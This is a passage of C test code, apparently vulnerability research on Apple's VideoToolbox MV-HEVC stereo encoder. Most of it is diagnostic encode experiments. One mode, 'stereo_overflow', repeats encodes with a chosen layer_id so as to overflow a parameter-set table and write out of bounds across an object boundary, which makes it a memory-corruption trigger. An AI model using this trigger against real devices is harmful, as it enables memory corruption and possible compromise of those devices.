            rlog("CMTaggedBufferGroupCreate: %d, group=%p\n", (int)tbg_st, (void*)tbg);
            CFRelease(tc_arr);
            CFRelease(pb_arr);

            if (tbg_st != 0 || !tbg) {
                rlog("FAILED: Could not create tagged buffer group\n");
                CFRelease(left_tc); CFRelease(right_tc);
                CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            /* Now call VTCompressionSessionEncodeMultiImageFrame */
            g_encode_done = 0;
            g_cb_status = -999;
            g_cb_count = 0;
            CMTime pts = CMTimeMake(0, 30);
            CMTime dur = CMTimeMake(1, 30);
            VTEncodeInfoFlags info_out = 0;

            /* Try the callback-based variant first */
            extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
                VTCompressionSessionRef session,
                CMTaggedBufferGroupRef taggedBufferGroup,
                CMTime presentationTimeStamp,
                CMTime duration,
                CFDictionaryRef frameProperties,
                void *sourceFrameRefCon,
                VTEncodeInfoFlags *infoFlagsOut)
                __attribute__((weak_import));

            if (VTCompressionSessionEncodeMultiImageFrame) {
                OSStatus enc_st = VTCompressionSessionEncodeMultiImageFrame(
                    s, tbg, pts, dur, NULL, NULL, &info_out);
                rlog("EncodeMultiImageFrame: %d, infoFlags=%u\n",
                     (int)enc_st, (unsigned)info_out);

                if (enc_st == 0) {
                    /* Poll for callback */
                    for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                    rlog("After 5s poll: encode_done=%d, cb_status=%d, cb_count=%d, pset=%zu\n",
                         g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);

                    if (!g_encode_done) {
                        rlog("Trying CompleteFrames to flush...\n");
                        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                        for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                        rlog("After CompleteFrames: done=%d, status=%d, cb=%d, pset=%zu\n",
                             g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                    }

                    if (g_encode_done && g_cb_status == 0) {
                        rlog("\n*** SUCCESS: MV-HEVC multi-image encode produced output! ***\n");
                        rlog("Parameter sets: %zu (expect 6 for stereo: 2xVPS+2xSPS+2xPPS)\n",
                             g_last_pset_count);
                    }
                } else {
                    rlog("EncodeMultiImageFrame FAILED: %d\n", (int)enc_st);
                }
            } else {
                rlog("VTCompressionSessionEncodeMultiImageFrame not available!\n");
                rlog("This API requires iOS 17+ / macOS 14+\n");
            }

            /* Cleanup */
            CFRelease(tbg);
            CFRelease(left_tc); CFRelease(right_tc);
            CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

        /* Test 2: Try single-frame encode with HasLeftStereoEyeView per-frame property */
        rlog("\n--- Test 2: Single EncodeFrame with per-frame stereo property ---\n");
        {
            VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
            if (s) {
                CVPixelBufferRef pb = create_pb(128, 128);
                if (pb) {
                    g_encode_done = 0;
                    g_cb_status = -999;
                    g_cb_count = 0;

                    /* Set per-frame property indicating this is a left eye frame */
                    CFMutableDictionaryRef fp = CFDictionaryCreateMutable(
                        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                    CFDictionarySetValue(fp, CFSTR("HasLeftStereoEyeView"), kCFBooleanTrue);

                    CMTime pts = CMTimeMake(0, 30);
                    CMTime dur = CMTimeMake(1, 30);
                    OSStatus enc_st = VTCompressionSessionEncodeFrame(
                        s, pb, pts, dur, fp, NULL, NULL);
                    rlog("EncodeFrame (with HasLeftStereoEyeView): %d\n", (int)enc_st);
                    CFRelease(fp);

                    for (int i = 0; i < 300 && !g_encode_done; i++) usleep(10000);
                    rlog("Result: done=%d, status=%d, cb=%d, pset=%zu\n",
                         g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                    CVPixelBufferRelease(pb);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

        /* Test 3: Software encoder fallback (no hardware requirement) */
        rlog("\n--- Test 3: MV-HEVC with software encoder ---\n");
        {
            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, NULL, NULL, NULL, encode_cb, NULL, &s);
            rlog("Create (software): %d\n", (int)r);
            if (r == 0 && s) {
                int v0 = 0, v1 = 1;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
                OSStatus sp1 = VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
                OSStatus sp2 = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
                rlog("MVHEVCVideoLayerIDs: %d, MVHEVCViewIDs: %d\n", (int)sp1, (int)sp2);
                CFRelease(ids); CFRelease(n0); CFRelease(n1);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    g_cb_count = 0;
                    int enc = encode_one(s, 0, 128, 128);
                    rlog("Software encode: status=%d, cb=%d, pset=%zu\n",
                         enc, g_cb_count, g_last_pset_count);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

    } else if (strcmp(mode, "diag4") == 0) {
        rlog("DIAG4: Fix MV-HEVC encode error -19034\n");
        rlog("Tests YUV420 pixel format + correct encoder spec\n\n");

        /* Helper: create YUV420 biplanar pixel buffer */
        CVPixelBufferRef (^create_yuv_pb)(int, int, uint8_t) = ^(int w, int h, uint8_t fill) {
            CVPixelBufferRef pb = NULL;
            CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
            CVReturn ret = CVPixelBufferCreate(NULL, w, h,
                kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb);
            CFRelease(iosurf); CFRelease(attrs);
            if (ret != kCVReturnSuccess) { rlog("YUV PB create failed: %d\n", ret); return (CVPixelBufferRef)NULL; }
            CVPixelBufferLockBaseAddress(pb, 0);
            void *y_base = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
            void *uv_base = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
            if (y_base) memset(y_base, fill, CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * h);
            if (uv_base) memset(uv_base, 128, CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * (h/2));
            CVPixelBufferUnlockBaseAddress(pb, 0);
            return pb;
        };

        extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
            VTCompressionSessionRef session,
            CMTaggedBufferGroupRef taggedBufferGroup,
            CMTime presentationTimeStamp,
            CMTime duration,
            CFDictionaryRef frameProperties,
            void *sourceFrameRefCon,
            VTEncodeInfoFlags *infoFlagsOut)
            __attribute__((weak_import));

        if (!VTCompressionSessionEncodeMultiImageFrame) {
            rlog("EncodeMultiImageFrame not available\n");
            goto done;
        }

        /* Test A: YUV420 pixel buffers with MVHEVCVideoLayerIDs+ViewIDs */
        rlog("--- Test A: YUV420 biplanar + EncodeMultiImageFrame ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

            /* Pixel buffer attributes specifying YUV420 */
            CFMutableDictionaryRef src_attrs = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            int pf = kCVPixelFormatType_420YpCbCr8BiPlanarFullRange;
            CFNumberRef pf_num = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFDictionarySetValue(src_attrs, kCVPixelBufferPixelFormatTypeKey, pf_num);
            int pw = 128, ph = 128;
            CFNumberRef pw_num = CFNumberCreate(NULL, kCFNumberIntType, &pw);
            CFNumberRef ph_num = CFNumberCreate(NULL, kCFNumberIntType, &ph);
            CFDictionarySetValue(src_attrs, kCVPixelBufferWidthKey, pw_num);
            CFDictionarySetValue(src_attrs, kCVPixelBufferHeightKey, ph_num);

            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, src_attrs, NULL, encode_cb, NULL, &s);
            CFRelease(es); CFRelease(src_attrs); CFRelease(pf_num); CFRelease(pw_num); CFRelease(ph_num);
            rlog("Create (YUV420 src attrs): %d\n", (int)r);

            if (r == 0 && s) {
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

                int v0 = 0, v1 = 1;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
                OSStatus sp1 = VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
                OSStatus sp2 = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
                rlog("LayerIDs: %d, ViewIDs: %d\n", (int)sp1, (int)sp2);
                CFRelease(ids); CFRelease(n0); CFRelease(n1);

                /* Try setting HasLeftStereoEyeView + HasRightStereoEyeView */
                VTSessionSetProperty(s, CFSTR("HasLeftStereoEyeView"), kCFBooleanTrue);
                VTSessionSetProperty(s, CFSTR("HasRightStereoEyeView"), kCFBooleanTrue);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("Prepare: %d\n", (int)pr);

                if (pr == 0) {
                    CVPixelBufferRef left = create_yuv_pb(128, 128, 0x40);
                    CVPixelBufferRef right = create_yuv_pb(128, 128, 0x80);
                    rlog("Left PB: %p, Right PB: %p\n", (void*)left, (void*)right);

                    if (left && right) {
                        CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
                        CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
                        CMTagCollectionRef ltc = NULL;
                        CMTagCollectionCreate(NULL, left_tags, 2, &ltc);

                        CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
                        CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
                        CMTagCollectionRef rtc = NULL;
                        CMTagCollectionCreate(NULL, right_tags, 2, &rtc);

                        CMTagCollectionRef tcs[2] = { ltc, rtc };
                        CVPixelBufferRef pbs[2] = { left, right };
                        CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
                        CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
                        CMTaggedBufferGroupRef tbg = NULL;
                        OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
                        rlog("TBG create: %d\n", (int)tbg_st);
                        CFRelease(tc_arr); CFRelease(pb_arr);

                        if (tbg_st == 0 && tbg) {
                            g_encode_done = 0; g_cb_status = -999; g_cb_count = 0;
                            VTEncodeInfoFlags fi = 0;
                            CMTime pts = CMTimeMake(0, 30);
                            CMTime dur = CMTimeMake(1, 30);
                            OSStatus enc = VTCompressionSessionEncodeMultiImageFrame(
                                s, tbg, pts, dur, NULL, NULL, &fi);
                            rlog("EncodeMultiImage: %d, flags=%u\n", (int)enc, (unsigned)fi);

                            if (enc == 0) {
                                for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                                rlog("Poll: done=%d, status=%d, cb=%d, pset=%zu, bytes=%zu\n",
                                     g_encode_done, (int)g_cb_status, g_cb_count,
                                     g_last_pset_count, g_last_pset_total_bytes);
                                if (!g_encode_done) {
                                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                                    for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                                    rlog("After flush: done=%d, status=%d, cb=%d, pset=%zu\n",
                                         g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                                }
                                if (g_encode_done && g_cb_status == 0) {
                                    rlog("\n*** MV-HEVC ENCODE SUCCESS with YUV420! ***\n");
                                    rlog("pset=%zu bytes=%zu\n", g_last_pset_count, g_last_pset_total_bytes);
                                }
                            }
                            CFRelease(tbg);
                        }
                        CFRelease(ltc); CFRelease(rtc);
                    }
                    if (left) CVPixelBufferRelease(left);
                    if (right) CVPixelBufferRelease(right);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

        /* Test B: Try without HasLeft/RightStereoEyeView (maybe they conflict) */
        rlog("\n--- Test B: YUV420 without HasLeft/RightStereoEyeView ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(es);
            rlog("Create: %d\n", (int)r);
            if (r == 0 && s) {
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

                int v0 = 0, v1 = 1;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
                VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
                VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
                CFRelease(ids); CFRelease(n0); CFRelease(n1);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    CVPixelBufferRef left = create_yuv_pb(128, 128, 0x40);
                    CVPixelBufferRef right = create_yuv_pb(128, 128, 0x80);
                    if (left && right) {
                        CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
                        CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
                        CMTagCollectionRef ltc = NULL;
                        CMTagCollectionCreate(NULL, left_tags, 2, &ltc);
                        CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
                        CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
                        CMTagCollectionRef rtc = NULL;
                        CMTagCollectionCreate(NULL, right_tags, 2, &rtc);
                        CMTagCollectionRef tcs[2] = { ltc, rtc };
                        CVPixelBufferRef pbs[2] = { left, right };
                        CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
                        CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
                        CMTaggedBufferGroupRef tbg = NULL;
                        CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
                        CFRelease(tc_arr); CFRelease(pb_arr);
                        if (tbg) {
                            g_encode_done = 0; g_cb_status = -999; g_cb_count = 0;
                            VTEncodeInfoFlags fi = 0;
                            CMTime pts = CMTimeMake(0, 30);
                            CMTime dur = CMTimeMake(1, 30);
                            OSStatus enc = VTCompressionSessionEncodeMultiImageFrame(
                                s, tbg, pts, dur, NULL, NULL, &fi);
                            rlog("EncodeMultiImage: %d\n", (int)enc);
                            if (enc == 0) {
                                for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                                rlog("Poll: done=%d, status=%d, cb=%d, pset=%zu\n",
                                     g_encode_done, (int)g_cb_status, g_cb_count, g_last_pset_count);
                                if (!g_encode_done) {
                                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                                    for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                                    rlog("After flush: done=%d, status=%d, pset=%zu\n",
                                         g_encode_done, (int)g_cb_status, g_last_pset_count);
                                }
                                if (g_encode_done && g_cb_status == 0)
                                    rlog("\n*** SUCCESS B: MV-HEVC without HasStereo props! ***\n");
                            }
                            CFRelease(tbg);
                        }
                        CFRelease(ltc); CFRelease(rtc);
                    }
                    if (left) CVPixelBufferRelease(left);
                    if (right) CVPixelBufferRelease(right);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

        /* Test C: Larger resolution (1920x1080) - maybe 128x128 is too small */
        rlog("\n--- Test C: 1920x1080 YUV420 ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 1920, 1080,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(es);
            rlog("Create 1920x1080: %d\n", (int)r);
            if (r == 0 && s) {
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

                int v0 = 0, v1 = 1;
                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
                VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
                VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
                CFRelease(ids); CFRelease(n0); CFRelease(n1);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    CVPixelBufferRef left = create_yuv_pb(1920, 1080, 0x40);
                    CVPixelBufferRef right = create_yuv_pb(1920, 1080, 0x80);
                    if (left && right) {
                        CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
                        CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
                        CMTagCollectionRef ltc = NULL;
                        CMTagCollectionCreate(NULL, left_tags, 2, &ltc);
                        CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 1);
                        CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
                        CMTagCollectionRef rtc = NULL;
                        CMTagCollectionCreate(NULL, right_tags, 2, &rtc);
                        CMTagCollectionRef tcs[2] = { ltc, rtc };
                        CVPixelBufferRef pbs[2] = { left, right };
                        CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
                        CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
                        CMTaggedBufferGroupRef tbg = NULL;
                        CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
                        CFRelease(tc_arr); CFRelease(pb_arr);
                        if (tbg) {
                            g_encode_done = 0; g_cb_status = -999; g_cb_count = 0;
                            VTEncodeInfoFlags fi = 0;
                            CMTime pts = CMTimeMake(0, 30);
                            CMTime dur = CMTimeMake(1, 30);
                            OSStatus enc = VTCompressionSessionEncodeMultiImageFrame(
                                s, tbg, pts, dur, NULL, NULL, &fi);
                            rlog("EncodeMultiImage: %d\n", (int)enc);
                            if (enc == 0) {
                                for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
                                rlog("Poll: done=%d, status=%d, cb=%d, pset=%zu, bytes=%zu\n",
                                     g_encode_done, (int)g_cb_status, g_cb_count,
                                     g_last_pset_count, g_last_pset_total_bytes);
                                if (!g_encode_done) {
                                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                                    for (int i = 0; i < 200 && !g_encode_done; i++) usleep(10000);
                                    rlog("After flush: done=%d, status=%d, pset=%zu\n",
                                         g_encode_done, (int)g_cb_status, g_last_pset_count);
                                }
                                if (g_encode_done && g_cb_status == 0)
                                    rlog("\n*** SUCCESS C: MV-HEVC at 1920x1080! ***\n");
                            }
                            CFRelease(tbg);
                        }
                        CFRelease(ltc); CFRelease(rtc);
                    }
                    if (left) CVPixelBufferRelease(left);
                    if (right) CVPixelBufferRelease(right);
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }

    } else if (strcmp(mode, "stereo_overflow") == 0) {
        int num_enc = 100;
        int lid = 1;
        if (argc > 2) num_enc = atoi(argv[2]);
        if (argc > 3) lid = (int)strtol(argv[3], NULL, 0);
        if (num_enc < 1) num_enc = 100;
        if (lid < 1) lid = 1;
        rlog("STEREO_OVERFLOW: %d MV-HEVC stereo encodes, layer_id=%d (0x%X)\n", num_enc, lid, lid);
        rlog("With pset=4 per encode, overflow at entry 256 = ~64 encodes\n");
        rlog("At entry 256, writes cross VPS table sub-object boundary\n");
        rlog("layer_id written to bytes 4-7 of each 16-byte entry\n\n");

        if (!VTCompressionSessionEncodeMultiImageFrame) {
            rlog("FAILED: EncodeMultiImageFrame not available\n"); goto done;
        }

        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, lid);
        if (!s) { rlog("FAILED: create_mvhevc_encoder\n"); goto done; }

        g_cb_count = 0;
        int errors = 0;
        for (int i = 0; i < num_enc; i++) {
            int st = encode_one_stereo_lid(s, i, 1920, 1080, lid);
            if (st != 0) {
                rlog("[%d] ERROR: %d\n", i, st);
                errors++;
                if (errors > 3) { rlog("Too many errors, stopping\n"); break; }
            } else {
                int total_entries = g_cb_count * (int)g_last_pset_count;
                if (i < 5 || i % 10 == 0 || i >= 60 || total_entries >= 240) {
                    rlog("[%d] ok, pset=%zu, bytes=%zu, cb=%d, est_entries=%d%s\n",
                         i, g_last_pset_count, g_last_pset_total_bytes, g_cb_count,
                         total_entries,
                         total_entries >= 256 ? " *** OOB ***" : "");
                }
            }
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        int final_entries = g_cb_count * (int)g_last_pset_count;
        rlog("\nDone: %d encodes, %d errors, cb=%d, est_entries=%d\n",
             num_enc, errors, g_cb_count, final_entries);
        if (final_entries >= 256) {
            rlog("*** COUNTER OVERFLOW ACHIEVED: %d entries > 256 ***\n", final_entries);
            rlog("VPS table sub-object boundary crossed!\n");
        } else {
            rlog("Counter did NOT overflow (need 256+ entries, got %d)\n", final_entries);
        }
        VTCompressionSessionInvalidate(s); CFRelease(s);

    } else if (strcmp(mode, "diag5") == 0) {
        rlog("DIAG5: MV-HEVC with ALL required stereo properties\n");
        rlog("Uses official SDK constants + MVHEVCLeftAndRightViewIDs + HeroEye\n\n");

        extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
            VTCompressionSessionRef session,
            CMTaggedBufferGroupRef taggedBufferGroup,
            CMTime presentationTimeStamp,
            CMTime duration,
            CFDictionaryRef frameProperties,
            void *sourceFrameRefCon,
            VTEncodeInfoFlags *infoFlagsOut)
            __attribute__((weak_import));
        if (!VTCompressionSessionEncodeMultiImageFrame) {
            rlog("EncodeMultiImageFrame not available\n"); goto done;
        }

        CFMutableDictionaryRef es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        VTCompressionSessionRef s = NULL;
        OSStatus r = VTCompressionSessionCreate(NULL, 1920, 1080,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create 1920x1080: %d\n", (int)r);
        if (r != 0 || !s) { rlog("FAILED\n"); goto done; }

        VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        int kf = 1;
        CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
        CFRelease(kfn);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

        /* Use official SDK constant symbols for all MV-HEVC properties */
        int v0 = 0, v1 = 1;
        CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);

        /* MVHEVCVideoLayerIDs = [0, 1] */
        CFArrayRef layer_ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
        OSStatus sp1 = VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_ids);
        rlog("MVHEVCVideoLayerIDs [0,1]: %d\n", (int)sp1);
        CFRelease(layer_ids);

        /* MVHEVCViewIDs = [0, 1] */
        CFArrayRef view_ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
        OSStatus sp2 = VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCViewIDs, view_ids);
        rlog("MVHEVCViewIDs [0,1]: %d\n", (int)sp2);
        CFRelease(view_ids);

        /* MVHEVCLeftAndRightViewIDs = [0, 1] (left=0, right=1) */
        CFArrayRef lr_ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
        OSStatus sp3 = VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, lr_ids);
        rlog("MVHEVCLeftAndRightViewIDs [0,1]: %d\n", (int)sp3);
        CFRelease(lr_ids);

        /* HeroEye = left */
        OSStatus sp4 = VTSessionSetProperty(s, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
        rlog("HeroEye 'left': %d\n", (int)sp4);

        /* HasLeftStereoEyeView = true, HasRightStereoEyeView = true */
        OSStatus sp5 = VTSessionSetProperty(s, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
        OSStatus sp6 = VTSessionSetProperty(s, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
        rlog("HasLeft: %d, HasRight: %d\n", (int)sp5, (int)sp6);

        /* StereoCameraBaseline (in micrometers, typical iPhone ~64mm = 64000) */
        uint32_t baseline = 64000;
        CFNumberRef bl = CFNumberCreate(NULL, kCFNumberSInt32Type, &baseline);
        OSStatus sp7 = VTSessionSetProperty(s, kVTCompressionPropertyKey_StereoCameraBaseline, bl);
        rlog("StereoCameraBaseline 64000: %d\n", (int)sp7);
        CFRelease(bl);

        /* ProfileLevel = Main10 Auto (stereo needs 10-bit) */
        OSStatus sp8 = VTSessionSetProperty(s, kVTCompressionPropertyKey_ProfileLevel,
            kVTProfileLevel_HEVC_Main10_AutoLevel);
        rlog("ProfileLevel Main10_Auto: %d\n", (int)sp8);

        CFRelease(n0); CFRelease(n1);

        OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
        rlog("Prepare: %d\n", (int)pr);

        if (pr == 0) {
            /* Create YUV420 pixel buffers */
            CVPixelBufferRef pb_left = NULL, pb_right = NULL;
            {
                CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
                    NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
                CVPixelBufferCreate(NULL, 1920, 1080,
                    kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb_left);
                CVPixelBufferCreate(NULL, 1920, 1080,
                    kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb_right);
